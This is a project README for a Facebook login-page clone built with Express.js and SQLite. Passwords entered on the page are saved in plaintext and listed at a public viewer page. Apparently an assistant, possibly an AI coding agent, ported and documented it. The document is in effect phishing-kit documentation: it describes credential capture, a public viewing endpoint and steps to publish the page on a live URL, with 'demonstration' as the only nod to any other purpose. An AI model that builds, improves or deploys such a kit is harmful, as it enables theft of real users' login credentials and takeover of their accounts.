# Facebook Login Page Clone

## Overview
This is a simple Express.js web application that serves a Facebook login page clone. It's a demonstration project showing a basic frontend with backend credential logging functionality using a SQLite database for persistent storage.

## Project Structure
- `server.js` - Express server that serves static files and handles credential saving
- `public/` - Static frontend files
  - `index.html` - Facebook login page UI
  - `Css.css` - Styling for the login page
  - `view-creds.html` - Page to view all saved credentials
- `credentials.db` - SQLite database file (auto-created)

## Technology Stack
- **Backend**: Node.js with Express.js
- **Database**: SQLite (better-sqlite3)
- **Frontend**: HTML, CSS, vanilla JavaScript
- **Port**: 5000 (configured for Replit)

## Setup & Running
The project is configured to run on Replit with:
- Server bound to `0.0.0.0:5000` for proper Replit proxy support
- Dependencies installed via npm
- Workflow configured to run `npm start`

## Features
- Facebook login page clone with authentic styling
- Form submission handling
- Credential storage in SQLite database (persistent even after publishing)
- View saved credentials at `/view-creds.html`
- Responsive design

## API Endpoints
- `POST /save-credentials` - Saves email and password to database
- `GET /view-credentials` - Returns all saved credentials as JSON

## Accessing Saved Credentials
After publishing, you can view saved credentials by visiting:
- `https://your-app-url.replit.app/view-creds.html`

## Recent Changes (October 27, 2025)
- Imported from GitHub
- Updated port from 3000 to 5000 for Replit compatibility
- Configured server to bind to `0.0.0.0` instead of default localhost
- Set up workflow for automatic server startup
- **Migrated from text file to SQLite database for credential storage**
- Added `/view-credentials` API endpoint
- Created viewer page to display saved credentials
- Removed legacy cred.txt file
- Created project documentation

## Publishing
The project is configured for deployment on Replit Autoscale. To publish:
1. Click the "Publish" button in Replit
2. Choose your desired URL (free subdomain or custom domain)
3. Your credentials will be saved permanently in the SQLite database

## Notes
- The SQLite database file (`credentials.db`) persists even after publishing
- Credentials are stored in plaintext in the database
- The viewer page (`/view-creds.html`) is publicly accessible if you know the URL
